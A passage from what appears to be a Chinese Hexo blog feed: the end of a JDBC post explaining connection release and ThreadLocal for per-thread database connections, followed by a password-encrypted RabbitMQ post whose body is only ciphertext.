<span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">release</span><span class="params">(Connection conn)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        conn.close();<span class="comment">//还给连接池</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述方法无法保证单个请求连接的线程，多次操作数据库时，连接是同一个，无法保证事务！</p>
<h3 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h3><p>ThreadLocal（线程局部变量）是Java中用于提供线程内部局部变量的一种机制。它确保了每个线程都拥有该变量的一个独立副本，从而避免了线程间的数据共享和竞争问题。以下是关于ThreadLocal的详细解析：<br>一、ThreadLocal简介<br>    定义：ThreadLocal是一个泛型类，它提供了线程局部变量。这些变量与线程相关联，每个线程都可以独立地访问和修改自己的变量副本，而不会影响到其他线程。<br>    作用：主要用于解决多线程环境下，线程间数据隔离的问题。通过为每个线程提供独立的变量副本，避免了线程间的数据共享和竞争，从而提高了程序的并发性和安全性。<br>二、ThreadLocal的原理<br>    内部实现：ThreadLocal内部使用了一个名为ThreadLocalMap的静态内部类来存储每个线程的变量副本。ThreadLocalMap的键是ThreadLocal对象本身，值则是线程局部变量的值。<br>    访问机制：当线程通过ThreadLocal的get()方法访问变量时，它会首先获取当前线程的ThreadLocalMap，然后以ThreadLocal对象为键，从Map中获取对应的值。如果Map中不存在该键，则会调用initialValue()方法（如果该方法被重写）来初始化一个值，并将其放入Map中。<br>    生命周期：ThreadLocal变量的生命周期与线程的生命周期相同。当线程结束时，它所持有的ThreadLocalMap也会被垃圾回收器回收。<br>三、ThreadLocal的常用方法<br>    set(T value)：设置当前线程的线程局部变量的值。<br>    get()：返回当前线程所对应的线程局部变量的值。<br>    remove()：移除当前线程绑定的局部变量，该方法可以帮助JVM进行垃圾回收。<br>    initialValue()：返回此线程局部变量的当前线程的“初始值”。这是一个protected方法，可以被子类重写以提供非null的初始值。<br>四、ThreadLocal的使用场景<br>    每个线程需要有自己单独的实例：当多个线程需要访问同一个资源，但每个线程都需要一个独立的实例时，可以使用ThreadLocal来为每个线程提供独立的实例副本。<br>    实例需要在多个方法中共享，但不希望被多线程共享：在单个线程的执行过程中，可能需要在多个方法之间共享某些数据，但这些数据不应该被其他线程访问或修改。此时，可以使用ThreadLocal来存储这些数据。</p>
<p>五、注意事项<br>    内存泄漏：由于ThreadLocalMap的键是ThreadLocal对象本身，如果ThreadLocal对象被回收，但其对应的value值由于被强引用而无法被回收，就可能导致内存泄漏。因此，在使用完ThreadLocal后，应该调用remove()方法来清除线程局部变量，以避免内存泄漏。<br>    性能考虑：虽然ThreadLocal能够提高多线程程序的并发性和安全性，但它也会增加一定的内存开销。因为每个线程都需要维护自己的ThreadLocalMap副本。因此，在使用ThreadLocal时，需要权衡其带来的好处和开销。</p>
<p>1、ThreadLocal对象.get: 获取ThreadLocal中当前线程共享变量的值。<br>2、ThreadLocal对象.set: 设置ThreadLocal中当前线程共享变量的值。<br>3、ThreadLocal对象.remove: 移除ThreadLocal中当前线程共享变量的值</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240810221326.png" alt="示意"></p>
<h3 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h3>]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-MQ-RabbitMQ</title>
    <url>/2025/02/20/Java-MQ-RabbitMQ/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="cd0bb402b133ee5b162593dd8745f7f2f01a630ecbbd1566bdc45e054841a89d">f29dd2349a3db70c0d02f79ca1d5b129c9c92fcc34fe1b3f16122c30b88678cc419825c2584ffe0016a3bbe6e4746c9fda7b1f77b8a41c8db9839dbc271d4e6f40629503ff13c2e2fd02748937ad742079067e95efbbec08be106243a17ceb781a58fa0470e40b97903c5241db2fac4deb7a7eb09815facd6dfe5c8764a357a4b6b9838488183ee23d08410511744f89495229803f66229a5f3eeeadb662b336cccf55f975033bac889c931dc39e928ad9233f9e49693e3fa7521c598c205a9b15bb16e2c1bb67623a2f4aa41e22dae9efae34465d13cb992fafb2d1d4f22dd42cda48d2912f85ee42d4c61960f5fc7d55d25af032263cd5ce15552876c2ec7b4d3abb5d2c5827a623c4f19db665d7f5fbb82c6a7f885446501eb48a131f6a6b92b91dbbb876128a6ff806311c0951ea9c9b0b6ce3ed7dbd25b1b059747f8cb9c48f04ae7e0f2f580b35845caa2e2abc86dbb2335dc142d02d6edaff5df9e96697b22f36151a963e0e072aa8b61e5108b0676b29890e7aeb8ff31fefb4bc91c2e93729d49cd9cf37381fc155de9bac7987d48e99b0e59e6976e436a420b39c851a5ef4d4c073ab9a41149c05b00743d0b06434bc81fa37cdb8ffc99fb0a6323016e56e214ec2f01d5b44c08694a4fb42abf7f7184a87547d847de9ba40a9822c6af630a37d2a729752dae89beeba132251b2421a516ab5a8a25037ea643762c3a549f00d525453c5d7b8fdf00c3ce0dad5f4b1a22f73f4c0103e937dc177be630dd2176836cff59c41d0fd2a29484f366713076dbb36b965a00d37980f289974e364ed6a0a62ee968c703cdcc7d43108a64a9406a3dfa1dfb9bc8c6e6d0693548b8c64bbef44da7ea90cbafd63ad324fd270f2cbd04636812a0f338d2816776a545cd52f94791f2b941ea7d306735a3048fdf2cf3c0726b8b84c72cbba55fd8db7fcd42a41f943b633aa866caa3eb3db650df805f867aaf7c73c75adfa23271b6bbf1afc9e3487324c45d619d769a18de75d9e97c1c1174dda2723e09fe381ef6799113c353a65fd8525d95cddc7a07334b9f11d90f4b010a1742a72019684f828a8bd87ebc11b90916076388d1082306b06479a525d523291bb7ef678ea44819d61ef8666a7a68ec722ac79b8067d6079907763758fd41badfcecca329b38ffd1715938f3c426a7c2a3c3d34a3935a9e82323517360974541c72b4864f55cb2edb368b09442859d77db230d1c32ad9abe8b9d5a5280a6f3f2b7b7bdfe01da20289f1f849f4ece33bcad42986970bb02cf1744e58f25d86588d688dd1db10edaea9da358fbf28e7dc490e11d9b667cbb6acdd7415e0ba7643207421aa569bd8363752fd078883bcdd61de8c3f562167d9e4f4859fa301183ab42482490ca19d806992670bc42f784ef8884f05032dc0c0d242b2c79ac3bed4e585dbe2aa9d402b2dbcf6475c5d5191d188632557997f6c321f6f02a89b2e725b3d5d9834875a4a4283e806e56f6c1a5de9e616bb1acd02092afd2dc88c2317d1277034ae2b90322009f80d494c511df3e2911168a17742843b932c51f2fce37fa629bae88f4e788e0ca2851845e6cf650aa0f26e9d2f4530ea877cb21c8663ce1bdc78a9c01905947278e30ace652c911a05e614532f0a034abdb3356d2745c089dabc29d09bc2209e13371a2716675a3b66fb7e5965c1dbeba81dc6bd6cc334f6dacfd3bd08f38a20640cc5dd99708501067446f942e03c77e247c604bebea60df16fa29296080d4ce0e75e397d04dde38ef23f0f5cc2b6df8afccb873ffc1f196d7ccac04910bb45847ef16fc707df5e70071c3da7ae839e050138d17e8ae4b32c863fc2ee98fd4ed19a31910cedd442a89d9fd59caab0bbaab6632b76c6422b2f09e9d9793c166248ca15ea34a62807517641c29a5a2f45eef23e72706ef3ceb72858dc3a4d85b011cd1e582023573fef69b1259c7d02d8c22c6eb28f8999b22f92ed239ef9e7e02291141429f88d6aba60ee411b34f2bea7e7566912025c7f9eec02559c8ba2e8ec041bfd3aa1999cdf32b21f517cc531d6df850b5f80269b77cdbb9b703020531ff626ba1f30f41f1307e13a9a11f43c9a19d6eb52f0a01cbe05d94ce6f0b84bdfaf1a5297a46f42ab94d21580afb2a29d37949bf268844e385f421e5d6e06d186d1ed89d16c7487eeded3009b6227e36ac5dd856427b68568d9802aa9a283b342f27d1fa840cf8dbd693761c5c780dbb66c2c5013ee69c02eccba7d8f41fdb8a6e4b4f62b514330960cbe3de54496bba6670abc723d197fdb88e35dd29b3620d3a03fed78eedd5f78985239f3f5434c170ce017da60dfaa3fbf2ec9faf7b40d392c9386892c4287d58181b4380633269da35c769df6a4e25d7380759dfab55fcae3301a5d32fd007572b26a739f16350a446c3cfefb88ad0b0341f3cf18ebbbb4080597c8835b91db6e25638d791b6a434445d32573bd06a721075b48d0b98b51923b3c985eb98630b2e2724ff1feca4a995f71ea4628a00abf690a0a41e3fda4d1114732e7c46f599110edfaf633d91c16a9a65d24d489c26d12180005ce1924b551a8b206b2d0b204125e68d13bffb10eecc864be99d1e7f921b26a7239875161df2e9939f0477405faf81116662768f1ab5648a1c12c7270056544672b759f55c2b2009e2a2035fe6149b6e5230a58404c8ded431f80292247f9aef179a2ecf9f3128db4d88a875d54a4f593abfae6167f90a684d71decc6974161e4469e4d9edbee83e1bb7bb70f2cfc2672874e993211a459f466a69739bff7b82cb65d2cdb5193468dab5fdc72672c1ad8ddef67bb9071b45cc7e32a69fbd69f5a69c4b88c2760a187013717f944f87aea6d4a22ae8d8b27d4ca6e4a628fe065b2d7317929f0669bd2eeeae02705dbc0630d175ab68ecb396c3981669f9f6096c77a1f20df46e1cf5a516099084a9e0bddf675ed0f971d99c78ade85a36acf4be91bc045e10e31d637ce75bda135bfe245980d0fa39f59964175c4b8ecce433a5ae2a259b2bb65192ecdacf19c456c4951733806a4859b7464fab7016f449a777c96c879b740abc61854720e98b714dbfad3839614be5571eb04581be63e6fd6ef797bc81ac6eff8ab95e554537429ee05cfcc645d70015fb04601891ef2e27ebb57d46d0913fce13b0e1fc30fdf69908473460a981b2bbb491328d645dec66401de850200277a5579751724f9b4193f3ec52818a68e83fefcb55fd76a2b0df698daa00d81d71218ca18222e502ee85cb0b515be85b3e1c581db30169985b0bc582aa25aa4147c28e21e02808a48bc90c4ff301e8a6b669fdcc8e264b74a902a69fc568bb142169a6deb76b3a2c9109648fed94176b14427378a74f92f06eb290b814a5b4b881ba4a6025f855ffebaf638ff564a7f70294d34439c6bceb51c93a23620c0d5b55572f80e0f4f9cd3486cbe34d1d59639046c247d1909e3af1d4cca00d0672693f707bc8208635dd0851582da92bb0c512124c4bf33eb567255de8b52c367ffd26785053b8bf6b905cb35ef9a081c5253df4d195e1926a2d43133f25fca6739dcdc02687f44c07f6d864f7ceaae09f9f11695f065341f888a9301f669e14436346feb2caabe83c3640b10319f1f0b9a011b75731e6e0a4053c9404ba3fa619d127b0e19076783a82f4287c0e01ff7baa11af1b958ca3934f99b5a2aa75b5e304870fb05e1d3d177325758492aa2fd279c1465d69dcd57fa2052a2b8153671487e70a726119ebfa3db077ff3642bd5179f0d557ceb2a1869d0fdb249661cfa8ee7c860db2d93a6bacd8afcfe57b417906982de057f617e665b589db10f2700e8188ec7f0c5e33d2b69e68bacaa6863ee5bee5253c2781ecb47b7d326c374ba4fa7403c7b36bbe955483d1c3f5f09252d5eaeaf116eb382f6cfabde77180e6616f547854a1b92198206b055785dfc3b8797369cc03da69899fa2576814ff9d635ee2583896b8538a6b0a730f12649400b28e23076922aa231fc5c4b94735303bc9fda8107e0b5cd944af7162234979a9ae01faf0ad22a22fc127e750ebe5a3765393bb0ef9c07499c5acc8cbf7e5615fb9537ce0cd0ee25d29d4040ff12941390e8d2b0567c0056f12595be3952bb5be85e68703b963bfa448a651df57d168cddc874dc288f3102f170e6d9495a495bb4c3f1f7c3e8d6ece6b0b83ccee7d9ee1eab0c2af90ed3fcbacbc88ab0cf0db3424f508cc00acfb9c61b72def826b00ade86778bdef6efee2faca5f6af3667dc962bd677fa6333c002bc91f841e735a170d68c530436bf3512af2c1275cf93053e97103a7319e0b7a8f1144eafd19e7c60ada30eaee1861424db88ba58fe06f3c3e197d94706094067f703bff528e620ecff5db42e426bf38f64e84749e55c205d47555a3e7323c24a9cfb07aa7eea5d4ca69d0486c8561e612495370944f7ac393257d1a876211225880223cf6ae6358a82891f19e98eceda2507b57f17c671c42d4e6380f7288974e8b2f87d4a6cbcdd17b9b48aa249a5f9ee9b3ce0d2a6c7d20d74c9a437c7c98003323f0926757ceaa30ca79140893dc922c6a9c79ce7f9690792dc1bf3522acfe207574861dd6d84a217b15f58597cd0f13c29f9deb44b1e146a47c2373a9b12b52f183293b60130ecf631bde021cdba2889ab91822bc76eb1348b88f88757a4629046cf7608c862a497ccd0c9baf0b1848c192dbab64b135171b243bec09ec58449d39b562a6117140874c6c7e9fd9183e2f47a87da41d6d73f3909043dcb4a2737f2d2014324189d295712af69a2df0de40c8c7bee55346e4084a6efb675533acfc85e7fde64bc364d14f0601512dd0acb4215424b25ca6657d664630a90da236d1888b66a0a33f4855f5790e37880c5920f470f5734d838ed7cff177d09f9ff5b7ce022ad11c185740ab0ce6afc87b17b06695ce1dcfc6466ea6e68c3aa4cedd3947a2a2c94f6db6dbb193a8dbf97e9a328427abd11ba51426e7774e7f22a8650ff46ff6323f7bc494f1fb1a93b31505ab4ede91d15cdbf513d4036b2b4e3ac1cfcac36bd63dbf39aa93bc57d416a1bcc2baf584db886650e40313652a8c23e1c06784c23a29439f8c774e50934cd507dd36dd6f0e0afb004c881813fc29a076c6f87e0349bc309fd1dd0ae2b4f160514f330829d8719526a4c796a2a1633376f9f54f51b2cd24265999ad04e03de7fd7a9873875281054ea22c358dedd6a5ff382214dd32da2c42d575bb0607928f9285d1af47fcc5beaee87fa535f3ece8c9bd73e77632eabb5944894a1f5128d1f2483ec90582adf22b9050cd0bd1ef31d04bfced8e54efeb5a9c9357be1012076b416e3cf2908e27e4f2b9045e820841a38608f5e094fed9dab821300b869d2aa01daa9c6c9ba00ed37e391b27eeeb143fb1182aad68aa6376e64fc7439f7230d4dcec5fa2e1a8fe6642eafcd53fb2d7fbfcddc0362ffe7f2ecd699357f657e1cfec7db8517c991ca9641aaf4689fb4493d1177d36e237981c41476cd4d1ff72442149d55c675f131170510793caab9d9c2f33883b01771cc377da01d903e5b729eb270476f64c413b4d45ea56bf57f65512a7a8c3ea99431a71eae90aed82537bcdffae066d2e155f06706b2138126cf701dd6fad3920aa5b95f46260f5cb85f1475a1fa58506c08fccfbbdeb01648861fdc6fcfc779e40406189c9ba27cc924f15f3d7a1ef84138418fa7bc5d1274c6f463ae4fff2dce544d14597051bffacc8400b5f4c114304a05ff3cd18a0497ea03696f0d6b339a9c3f89053fe904b8b56b0b04693c2fd6058bfb82c74459ed0d702d6ddbb3b0ffa653df265f872343d3e81f8c9541fc1eba5f44377dd6b88e6262396a420b3b3e85eeff808b7f6183009042dbecdf1abe0b1bf83fe13fa46481182088eb9e1ffa72b03d49f53db6660a524ae34736f30c1c4766f0ef842f5b94e2fc94455cf7e8db9da0e3b77b5093514e492aca82093e074561c0f99ddf86ad376bde688913be57c90fcd0ff0eff42d976dc3e2d75ef0907f66942a25c3d001aa09afd325dcd4c5863cdd11d20f762d25c42a8c6d233ae036ebea9d75a1c0c9a654e7e2c4eb658f69a0b0894d965fe32db4acb340a0db35bc1761dbb5cbe3185a72fbf76d17be8c084bcf5d673506aab74373192c71da689514ade903104057177c0696002db6140bdd0420b892c2bea3328864ce585fa1f838a04f14429faaebec6d45eddd451fb207866c1381c5096921e111ac4e4c04dccf2dce3e100433b5ea9e76d3e85bad02315b9bd187e789f75e40f35e31467d26197d41be8ee8667073303f054b7b98d1b4a76f659862b6d36a13a304ba16563dcd02eabb0afa8190e65cb525573f44a6979318aa6366e4e9016a4511e9c351d1fe0f6cfd55182685e8be4838f968c1ea12bf03ac1096e0f6bdee9525988292c1b7eb0f7b4728b8bed2b02c14a5fa4708de49c9aca9311e5af6f21a454d4c75e57bd65e9699c0c654fa8b6a5bbe97da48b954385ca79b1515d842493fdac3ca23f6218c85257dc64bf0519ad4a859497ca4fbecce5cfd7ceef115bfeeee61f90464c811b86908d250395a6ece1da4621c6300e12cf43fcc242f95561c81d36d3a8028cbcb81755a45cfebe83b489e6e356f6928776f7ee1ecbec1a3a0777c54b0cd78025837c1291adec2166c4db454a32e619e3c31ed8f2918b0f5dc3c60d79707b7f77836ace1231eaa9b5fe0f86940a16da1b0cb45e6024d1584e265d9be900218f7cd145a4a8edab4b7c444c01903dbf8a11b884e3da3a54a56927c09097615705ee9dc4df952457950617c116098cf09aad5a0d3e515ebeaafca639d9d13b8c8b5f309d0deebc1c8d62322bd8e6914b7dda36a220af12b6dd483dff15839f3b94aeb788fd52a8a232060ecec20d24f0230eeaae080273fd75caf8abcb4bdf6e205d405434640f4a40935d1954393907aacaf7952a2599ba7e67cdffe913d60424a58b726f2d8c67544d8b18e832523db7d7bfcf942318b2dbb62d01b48483b465db158ddff600d8123d96c133217a4e3f114faf7fa18abb6ef0a0b1fedebd53a9e5a5a8fd9b2eb56d208271306b430c8592cc407d7991008ce803dec3e1c0d320bb155bf48cf5dc0aa3646bf70527429ccd453464e83fa0e373222be86b3df53d6a4fab42bb5e4abfdc6048ee487e262a71e2df3128ed0bee9b4ced9ce8a469578a3f480c0e7a4e6b165c3d31416a0555e2992535532daa0397e29b3adc00f0508d865febb5907f57ba571a88215796562b27d0352a6c817524a276e7636077dda15bf76fb05cfcf7423364438ff75379fb2bcf253cc845da3eed1c430995d70b04599ec6fbd12bd64cc7c7a94bdb4410b36a4d90b48cd7a7bae05d8e3dbb4305994cf69348dc38c1cebe0da36571f8ecf85e918743df3c23ccd0fe40d3d2a9fe8f3c0ecee14a045fcacd8edc6563b88961e11f7391491ce1cb9220cda4c62fd8dc4c0519c0d54311b77450ff44564348f37776626eb375c6b92cb3e0c8ffb461879032b0a2b7f546dfafe905b0df08ab8db98ef2340b5af2fdea1a9a4f260289649480c6ec1d871bffcb0133fe215e4b639e5c4faa320667af120ef3d44c989e39ce1c32d8cc5089cbe5ec3dcd46a4ac645c22e0c0ff13596928e4f9b0f692d081fe74299f0cc171ce0917f709af48e0399793f42cc014d77461da8b9d8ec8a42b626852f3eb0bba23b8c8fa12bce2799d80cc19f76d33a7ca22f0a14604267e833858f98b3370b312842ad09b3583d0da79f76c39f5746f50eed66452bda5a7cd9415576a095a0eaee1260d1b47f7707d0368944cc12d99eb97d4477fc9bd4e34293c38ea0251f2d7c5292c3bee934a60d0e5073e30dfa6cbcf95167816a17e40c34d17e901b5712074bd1b43578dcb1f0899fa650d2974f62ae25ab18d63984f232d2d188700a04099b45a105138012557e28a131a177d683403a6ad921a114db6eb3ef420e41315dad73092e075aad200a125ea526b27aceeb2d4fa08c7ad9225cd2e4bdd2a3e50b7b3c3c6a6e28f86368b78312badef9722bb1d82cd54ecca0d992cce68a50a4e1d32dc491dd7ca9486c1ea395a22d397521d44eaf30a0d251536f9dc6270b831fcf67421cb65706ab4d05853017d36c58a60cc5a825ca64950d98af387db608ec116f55e6600a1435cdb2d63ab004098214c09fe057549dcc0a0307211a570595c4475d9e8cbc2a199b1ffdbd6da10d03e65281f1370b4650babc07bb3db1a3291151446415a8778ffa3841c9b5774bcf91d67cd9ae13bf36431cbe79fa523aaa0f308ed549d68ff955943226456d2386afdfa5bf26c039d643a96e98e1b1c467c3cc4755d4bc4aafed4a1fd92d5b55ebc01f06a11a5d40cd7578527300a10a0d0dcaf43ccc02e9498a50cd053623381ba5bc1e80be380b4199d4e2b28fc158a5df6439c304263ff3923e1c38be81d6ff9c807d09314f7a7c337aef0c7509fdd541e0e786502859747c327ac25e5be4af1e09919490c4f6deb18cd5642781226788b051247fd51a1b6321d487f58db380219753b53427b141c136d2c0a4512892ec0a0ca0e7caf509a11e61c8136e6e87d4de685d841ed793dde66a5afcf448c2aabddf3dca335a0f5e33df84d51dba2fdb7214fa61a8462191fe4719daf40bc1c0a1f14feb1a41e4ec3bda9739b5bc030bdb20ab216a4c45ab23c35c8a39c18780abe632de911d4500105522d36992e89c326f03c8359bb06c876ca094305f5807d2c9b231eeb9b8645e5348b8ce08b9c38c1cc6ec4073973e7fb6c9bceee74ba962ebe0e223c1a75395476da267921d5e38a18556b44bfa92eeb74bfd17fb3353cfa601a2c573081761c01ad7846d048ae2ae4b04fedb3c0dce56b38cb3c378d68b42c2230594a1bbb68a2b508e2f2d0008a9e9d21f2e5c8f20e2845f7b1c4baa5c0151cab894c4849be57f80538b8b2e51b2c175f128736a1701a04da2b60ba4ccdb7f5054fc4ef93850d6515ab879d14eda3a8feafb5aaad74f42c8c19fe875aafc7a7ee1332e0a5f2f08ccfa417688d4c0241ad19cc750c1d0e19614a1e0671c1bcd58bd24e6b79a52509eac333ddd2340b3c796030f284f35d7dd2f6d8a290d87aa1c55abcbd6efa5f4537c229d3a26a6d39fc0b29099ee99780e32d65ec66d3f83368b39c337cfb68b75829edf4c40fe1146af8894693f94f0721f9085c373e7affe8c84da0fe5b338f12b6db5943e498b003b3e91992f88792b1e71dc4774be2b1fce0283908369d4f6f7f356ccc71efba56497a5a3d19770cc4df2cf722c7b8a07819b3324b00f95107a291d5a8d05648891a09580849b2d33d47f309d54201aaceb4cea18e078eb536b91a6a89aacdc3046835d92c6521104e4abdd8d81ac36b3b78ac7cee404661b26283fa0f7766d7aecfbafd795980b8d3f6161afe8008098a2c1a7f16da6a722f609c5eb7c151878e7d6f28493cfcb9df1d47cf34b1a1f63931ca1a81d403e315cbfc300fa3c378b03f29df62604f499676d5ae69d471031ed9ca9499e601d92b0d2998de07cc555db2ac3578f9aaedd73b4e48ebe479ecc39a12edd40fecb33577b8f630bef3890e6ab2690e3cb5c957953edff372ff01b7a4e6284aae54bf9b58bbff769c1672522a8bf4d62f70990f40e7e2af5a20ed258e58efb9f83aa125cc8dda9d335558014b2bff9d66a5c717eed1662d1aa5c65d94d8d74608979f38f35df7f2e9999fcc567e8dd0e72d068b659295e303033c8b035e0cfdc20b8e9571e7be52601d4742f5d52be406dbe71e28582030441046c28a4e0fe09b1b82037167b2cf0402b622088786ca0a18644497f8ca59a19c64e0895f1bd0f513a50799b8a3261bdca090d121a4ccc7a3b8decd7e4a6bf7431d08fec93b210abf7a983e223fa5f0d1cb2a713d5235e07ae06e52c081b2d7aef8c6870d5f440acf0b5c7c9fd1e421a749c73d425fd144786791e04feda710fbd2ee9df36517615ef033651bddf72fb74b984dd8959b3a92f666284b027b99e09515ee597075754f16c19251b37fc12416025c37eed4497d259a45a6f20812cdb5d2f43ca62a40e0c14dd20a842c6e8cad563390e388c56af3044d492a35d71a1e3a4b20f1d61154b22f221f50b7006441027cea39830985b2c76b39eba62764dcf8ba4b6669e50d4a04dd912421bd74c5ebadecd80367f008f9ce04c480f46cdb784f533a3be07c63988240de4d852ef1dd476649b5d1cde43a562c6f444d7d264d73a99b9c9f612a34f525e5ee6406de16651637f7e97e5306c10f00b56a6cc1c71c38ef728403e45dd9c5c51fe2449954925cea958f516e44bd8a59a84be1abad5607ef0ec35a6e71eee1c77a25f3bf0ca22719c9db3be868890618ad631bca9fae8b16b4723261b82c9161ae814ff6848cda02ea2ac8e6bad57f6d47311daa3ace10a3383f2c47ade3aa54b8d83afe5b7bb2da735eac7769fc6ae8342787dbd21e59c2511864c076283a092a24c72d0b26c58703c319a272f382226d2bcbcb835b30822a6a4d04c6fcbe78f25dcab9700d6b6dda943776cf7e047e4cdba218a2a9cf9991e9ee84004f4a01ab0c40ef9bb5340d6bf2777f189c480c7115c8f2c6db2c6c58920b80b708dacb77468d35219e23aa61aef5803206dac20cc389d648dc27e6af751ad5d2a978ad3c4132602b73a035d3ba7ad9381155179af4a47fe97dabde8cf853ad6449ed8b9b8ff54d95920e5b442880f9862261ef0418b300fb84bd92eadd9c595b4bdb7c1b2985d9007c0bc161265b9092a608509d5275b47189a293493d32f1c3b14df5a910ae27a1fd403632c5dd7d079d199458755d64730b88d7b4dd4cf004b8c8780e613b89aec09355c577729e93e5da08781d412359a9185356adef8f7ea861899645036c4afe045e692eb6d664201ac3bb9407744dcb96631ff94c17cf63f349f380f47fe720405719b65653fd7ce0df8b97ad898dbea718a19633ea8932b39374147861469f11a77ce91f376c2a82be7c6a8ee20983027f386522b1cbb899b9d616322bfdc4d02c7892214722cc8b0797479ba4694bb53a307e36c33878b5cbfccfe1d01b396336cf07c354ddb0fb125422b0da02616c4d548703ae0dd8429eab15a9526c7e06e53312227555a13b287aceedcd01e7d960cd2de25c59efd711726e543d419884bf2f60f58289359e09a6387939adf8d38316837ae7550f4aa4ed07827a2aba32345404706e37c37d8f5840d2ea7cfa0dbabcf4d1db66822e81203e3b0c64142051509a2113138b74f6e2f49ca0f4994aca0b98926376310c5fd7ca21416805427248befda67f6d5df3bdb22e679106081ca0c397540340b192c1b2053b4e3c70ddfdf4ebe2806d96bae7e179f0e10d88514ec92b555577f9e98709a649b89bf6ddccd6f066c2c9a1e18f5f1f477de67285c41a62ace39e1d2cbb3223dbdb82f7080e06bd4c00247985996fb9f0e3f3f9500ad9f4cc771da6d62ad3105debc15cb4170078a8c505ebbf0b8e0277aebbc909dd71a5d643779966974a6828e6438d33d7f44bfc6b8348a448f3b52ac9014811c6d36044c2cecae3cb8c6e4a341e5e73a3d376375fbcffb485a0bc13e421e797efe81445603a7d04031d338812b692ef96680933bbaefa95aedf1fd8498d6f35c33d131238d37d130319bc855ff9f1e76a12f40da44718dd30023049f4b60b00584687750a5f72357ef2053d2514d9d392ad2d1525d43f049a7c21421f5ab871792c3280748cf1f8c6a11ed11ed898e6f76b3ed73862ea4df26e8328386dd2c7dc8eaf316513410b121fbc97870fd2529c8bfa578a9d02eddbcb3377565d484f5fbb274034f744fe20da599ea6f397aa004f61ee659969eea5df6d8f8da7cdbd49f0e5b73bd8a0015ade76ae7c5c945184222dc1fa43191f8a7ab2e409f928449d0b0593c05eaf0d61bedbad9b3b1a45c88607f75ee7b1f3ac6e1d3add3f42c7b3e51d04accf4ec7dd1a9f01d6d4370376955dc7ae164ac40d3805a87820a0c8fa315f158cac9904f9f007c514646ba21fa44451ef86d648536ce3a84e23da8bb16597a60dfcf06f1df0ed5550244780bad78b2bbfb9464f2436824ad2e41f92b7fc2a82edb06f9a84dbdad35e64a6e14b36c711ed8f80c27b011f4cf979c51d1ff2095a5309d30f1af7fab2874854899c401bf55c6ab07b9645ca2eeeddea0769cd2d2b6a5bdf3577dd74deef2d6a20db5beac9024d085987a7a1530df00935d520e2dbadadf3666b7de9fc8a7fa79fb70845c6dfa22569ff10dadf8ef3ef9335e37a9c410029b45bd7b27bdaeb01042cd9c894c2f160f73cb74fc401c9f2c5a58a04a90c5f98c993c0753b2aa21e8e7602adece2a03c8eca6768a521976a999a62ed731c33b2714f372190b78865ea8a52ab654f172afc02443718c9627763a932f2cb4a8dbfadd30b406fab635ea0028e04e8412c9f5aca6c8a5e1dcde443ec79a83213bf19b64ad806dfad69aaa79902e9101ad62fb5185a6addb9733a4fc9b3c3feca69d6a753f9d8bcbf79f1efeb2791a8be89ec8c352e3672175b60207aa18ede9c380125f11e54af6d4942ad9ce3596a6f0e65841dfb92da5acef97a367b5822e07ab166a3cba5076efdacff9b6cc0a981504696420a4cd4c1b2669de0d6aee08f221610f2da0585bd939968f2f3ebda7a64631f43167026071f6874c15e60917f2a60cb03e2df9974c9c1dac343af935b975c6a136048f2edd40fbb3f2f0852f432b765b7e01e1f3ea3547a1fb67c00a93c26778bc31a8a53196d3ab2d06c95cde478eaf8709d9f4c53f424556a0a797edc1e293d5de32e63320f0da77a3f80a7dd9157e5ff03c3b1ad4ab03cec9ceac20a14bf8232bf0529f71077c2a7a745a3935bec19dca2303890ae9d79a4041fb14b677caa2153c2d96c93f4243d0afadbd0cbfbef415eb9e9e4101a6da6a3eae7604bf00e616d18888fc3f460b05355539abbc682b5553e75900a3733c771f1ae0757eca3f08841511382aa6ed087359db1bac336b98c8c63373b69bd48881601392456dc22b89e7f64a178b8a8373ccd8067f7d9b133e7bc5686acc3d293db23249036bc56f831c858bc32ab57f126d3880f9877e239b5316bccef14e44fd1cc608e61a206abb8cca6d1ed6933b98f74e1028695c3e2d24cbfc2b2b76c47ed1373e71c847e0372e9036f5a3837aba55d87c7690e873724d74b29444e434d123e0d45dea4179560c1ea7aa1dbdefe4c59692a570bc2e800d356d5f21434fad3c7274c1be9407d133b24f8676ae9e637aa45dbd0d4bb6b2f9d2651c47749acffea59b3472b8f9f94f52c7267c84a746f70a5629ce613f318687823c06ce17d9898c8ceb2ab2fc3651b69fe453258ebb4f5af58214095ab97fcf5a04bc08e7e54db211716aaaa14b68c118f3ba448111cf5ce0ecbecf88e9175fecf78e46ec2aa2ec77fce09419289bf84f3eb1e06b505072ed3084cfa454bf943b861715bc4c3342a34080a4f0027f6496c5c07fbb8cff06666ef58af168586dd8976c689ee5bc8a8d99b1fb49567f3cdac2df07ea055bda1b7a626a6233be7320d7eeca8f7dea198fab63f6a3dc053a1826a68e9a8430c616ae502f70d469578e1641282bcadcf2471dc9e0015433999191aa9e2e2c6298b2a8f8afc20f320689b6e078df2a2681da03c99471a9b46614e9f98af17dc5919876dc4cf7eea46a732808ad963ab673734a5bf0b6bcb70e0b1f62ebaeafe665366387fffad3608f2d49536e1fc90e7557a5aabdb9d3cea2f8be533e399d9b459a7ae75364d10f953de5e16316f89cacc95241335be3d7406b1903f16a651aec2fd8d5b2f536758c3216d504bec8426bb276c4598584c2fae30c09ae99245577b264c5a5016e82545fcbf10a1e255028f91a283a3ce63d865ddf66c7fc4cbfaea89d32d900863e6e05771309519316fe607b7ac755b17150dd4487149215b4e4f0ab83aba8cdd6a8dfdb0e044441857662ed369147499fa6ed7ad30be6fb0f5a1f14faceea123b6da32b6bf229e6a7f7222c5fe87d565f57957ad89f53cd3a9062eff12b3cc0bfdad103cfd4313fff083de9c92ae98d109acb25dfe3191e1acee11b4129a58aabf2164009030985a35db4603be723144e8235f79a864b3ff3054500fe95543f7afd6f6cca184eaf7879617463ed57d05384bb8247f017074ed3